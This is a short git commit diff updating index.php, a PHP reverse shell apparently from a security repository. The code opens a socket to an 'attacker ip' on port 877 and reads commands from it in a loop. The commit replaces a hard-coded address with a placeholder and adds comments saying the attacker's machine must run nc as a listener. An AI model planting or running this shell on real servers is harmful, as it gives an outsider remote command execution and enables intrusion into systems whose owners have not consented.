f781df05ab590511d1efe28fd830c8f4964dd8c6
死老百姓 <96654161+Trinity-SYT-SECURITY@users.noreply.github.com>
2023-06-13 14:07:29 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,9 @@
 <?php
 set_time_limit(0);
-$ip = '192.168.10.10';
+$ip = '192.168.xx.xx'; 
+//attacker ip
 $port = 877;
+//Attacker machine need open nc
 $sock = fsockopen($ip, $port);
 while(!feof($sock)) {
     $command = fgets($sock, 877);
